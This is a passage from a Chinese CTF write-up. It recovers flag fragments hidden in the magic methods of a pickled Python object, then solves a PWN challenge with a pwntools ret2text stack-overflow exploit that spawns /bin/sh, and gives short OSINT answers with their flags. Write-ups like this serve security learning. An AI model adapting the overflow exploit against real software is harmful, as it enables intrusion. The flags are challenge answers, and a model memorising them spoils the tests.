bWFpbl9fCmhWTk50lFKUfZR9lChoKH2UaCqMC2NoYWwuX19lcV9flHWGlGKMCF9fZmFrZV9flGgSKGgUKEsCSwBLAEsISwNLQ0NOZAFkAmwAfQJkA30DfAOgAWQEoQF9BHwCoAJ8BKEBfQV0A2QFZAaEAHwFRACDAYMBfQZ0A2QHZAaEAHwGRACDAYMBfQd8B6AEZAShAVMAlCiMKwogICAgICAgIGZsYWcgcGFydDU6IG0vdmlkZW8vQlYxR0oKICAgICAgICCUSwBOjBwrZjhFK2tQekJQWDNLUzFETnpRMDZ5cjdLdUE9lGgwaBQoSwFLAEsASwJLA0tzQxZ8AF0OfQF8AWQAQQBWAAEAcQJkAVMAlEt4ToaUKWg1aCBoNksqaDcpKXSUUpSMIGNoYWwuX19mYWtlX18uPGxvY2Fscz4uPGdlbmV4cHI+lGgUKEsBSwBLAEsCSwNLc0MafABdEn0BfAFkABgAZAEWAFYAAQBxAmQCUwCUSxtNAAFOh5QpaDVoIGg2SytoNykpdJRSlHSUaEUoaBuMC2ZsYWdfcGFydF80lGhAaEZoR2hIaEloSnSUaCBob0siQw4ABAgBBAEKAQoBEgESAZQpKXSUUpRjX19idWlsdGluX18KX19tYWluX18KaG+MFnR0cHM6Ly93d3cuYmlsaWJpbGkuY2+UhZROdJRSlH2UfZQojAdfX2RvY19flGhxaCh9lGgqjA1jaGFsLl9fZmFrZV9flHWGlGJoiE6MDV9fc2xvdG5hbWVzX1+UXZR1dJRSlIwIYnVpbHRpbnOUjAdzZXRhdHRylJOUaI9oKmgIh5RSMCmBlC4='))
```

<font>后面进第5行的VSC断点。</font>

<font>都藏在魔术方法里了。用inpect找重写后的magic method：</font>

```python
def get_methods_info(obj):
    methods_info = {}
    for name, member in inspect.getmembers(obj):
        if inspect.ismethod(member) or inspect.isfunction(member):
            print(name, member)
    return methods_info
print(get_methods_info(a))

```

![](https://cdn.nlark.com/yuque/0/2025/png/42686343/1751891832660-9f699212-03dc-437d-ad15-10d0cd1c3caf.png)

<font>发现有三个被重写过的magic method，</font><font style="color:#000000;background-color:#eff0f1;">__eq__</font><font>,</font><font style="color:#000000;background-color:#eff0f1;">__hash__</font><font>和</font><font style="color:#000000;background-color:#eff0f1;">__init__</font><font>。以及一个自定义的</font><font style="color:#000000;background-color:#eff0f1;">__fake__</font>

<font style="color:#000000;background-color:#eff0f1;">__eq__</font><font>和</font><font style="color:#000000;background-color:#eff0f1;">__hash__</font><font>都调用一遍，获取flag2和flag3</font>

```python
print(a.__eq__(1))
print(a.__hash__())
```

![](https://cdn.nlark.com/yuque/0/2025/png/42686343/1751891856369-452965f1-02e6-42b1-b9ff-4eb22ec8d8fe.png)

<font style="color:#000000;background-color:#eff0f1;">__init__</font><font>调用时发现需要三个参数</font>

![](https://cdn.nlark.com/yuque/0/2025/png/42686343/1751891867229-776c2488-4c72-404d-ac1b-dd274906a141.png)

<font>随便传三个看看：</font>

```python
a.__init__(1,2,3)
```

![](https://cdn.nlark.com/yuque/0/2025/png/42686343/1751891893537-80dfbf32-6fa6-4c90-bd56-d81859bf278b.png)

<font>为了防止这里卡住，</font><font style="color:#000000;background-color:#eff0f1;">__init__</font><font>的逻辑没有混淆。base64解可以直接看：</font>

![](https://cdn.nlark.com/yuque/0/2025/png/42686343/1751891910388-7a84767c-7a3e-46e1-b9a6-2bf96def506e.png)

<font>flag part1: flag</font><font style="color:#000000;background-color:#eff0f1;">{B0tt</font>

<font>然后就是硬找（bushi）这个__fake__明显有问题</font>

![](https://cdn.nlark.com/yuque/0/2025/png/42686343/1751891938112-8b97ee1f-a486-40d1-a29a-7d91e8406f2a.png)

<font style="color:#000000;background-color:#eff0f1;">__doc__</font><font>找到flag part5</font><font style="color:#000000;background-color:#eff0f1;">m/video/BV1GJ</font>

<font>尝试调用一下</font><font style="color:#000000;background-color:#eff0f1;">__fake__()</font>

```python
print(a.__fake__())
```

![](https://cdn.nlark.com/yuque/0/2025/png/42686343/1751891987304-33675d08-5f68-473a-8a1f-dce7dfa57781.png)

<font>找到flag part6</font><font style="color:#000000;background-color:#eff0f1;">411x7h7}</font>

<font>随后尝试去找一下</font><font style="color:#000000;background-color:#eff0f1;">__fake__</font><font>的参数看看</font>

```python
import inspect
print(inspect.signature(a.__fake__))
```

<font>找到flag part4</font><font style="color:#000000;background-color:#eff0f1;">ttps://www.bilibili.co</font>

<font>拼起来就行了</font>

```python
flag{B0ttl3_❤_pickle_and_watch_this_https://www.bilibili.com/video/BV1GJ411x7h7}
```

<font>以上过程听起来脑洞。但是实际上，如果你是一个inspect大</font><font>🐍</font><font>，可以直接手撕掉。（（（</font>

<font>这题主要是考了一个比较新颖的点，就是从python object里找flag。作为misc的题目都已经不常见了。但是由于难度本身容易所以给塞web了。</font>

<font>而且python object debug真好玩吧 XD</font>

<font>SSTI部分不难。但是如果想不到原生函数的话那就完蛋了（牢牢牢）。所以题目注释里给了一点引导。</font>

![](https://cdn.nlark.com/yuque/0/2025/png/42686343/1751892088523-8f3bbb23-f009-4ad0-bc5a-26516d31bcbb.png)

![](https://cdn.nlark.com/yuque/0/2025/png/42686343/1751892093141-01189ebe-f3a5-4aca-b078-46fab42a7ff0.png)



<font>解法3不写了，气死我了。</font>

<font>Have fun！</font>

<h1 id="zq1GP">PWN</h1>
<h2 id="SNcw2">签如到</h2>
checksec：

```bash
└─# checksec --file=vuln
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH   Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   47 Symbols     No    0               2               vuln         
```

发现没有任何保护

看main函数

```objectivec
int __cdecl main(int argc, const char **argv, const char **envp)
{
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
    puts("Welcome to the NetDreamCTF!");
    vuln(&argc);
    return 0;
}
```

跟进vuln

```objectivec
ssize_t vuln()
{
  _BYTE buf[68]; // [esp+0h] [ebp-48h] BYREF

  printf("Enter your payload: ");
  fflush(stdout);
  return read(0, buf, 0x80u);
}
```

vuln()中的read(STDIN_FILENO, buffer, 128)允许写入128字节，但buffer只有64字节，导致栈溢出 

看shell函数

```objectivec
int shell()
{
  return system("/bin/sh");
}
```

打ret2text就行了

```python
#!/usr/bin/env python3
from pwn import *
context(arch='i386', os='linux', log_level='debug')
def main():
    elf = context.binary = ELF('./vuln', checksec=False)
    p = process('./vuln')
    shell_addr = elf.symbols.shell
    log.success(f"shell() address: {hex(shell_addr)}")
    payload = flat(
        b'A' * 76,
        shell_addr
    )
    p.sendlineafter(b"Enter your payload: ", payload)
    p.interactive()
if __name__ == '__main__':
    main()

```

<h1 id="jw6cN">OSINT</h1>
<h2 id="RoPB0">where_am_i</h2>
蓝色十字很显眼，上网搜得到渥太华医院

flag{渥太华医院}



<h2 id="Me214">Bridge</h2>
甚至百度识图都能出

flag{牌楼长江大桥}

